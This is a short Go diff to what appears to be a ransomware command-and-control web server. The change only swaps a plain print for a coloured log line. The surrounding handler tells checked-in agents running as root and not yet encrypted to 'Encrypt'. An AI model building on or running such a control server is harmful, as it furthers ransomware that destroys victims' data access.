@@ -2,11 +2,12 @@ package Webserver
 
 import (
 	"encoding/json"
-	"fmt"
 	"html/template"
 	"io/ioutil"
 	"log"
 	"net/http"
+
+	"github.com/fatih/color"
 )
 
 type Enumeration struct {
@@ -80,7 +81,7 @@ func CommandHandler(w http.ResponseWriter, r *http.Request) {
 	//Reads the header of the request and issue commands
 	//Tied to Agent.KeepAlive()
 
-	fmt.Printf("Device %s requesting commands \n", device.ID)
+	color.Red("Device %s requesting commands \n", device.ID)
 	if device.User == "Root" && !device.Encrypted {
 		w.WriteHeader(http.StatusOK)
 		command := []byte("Encrypt")
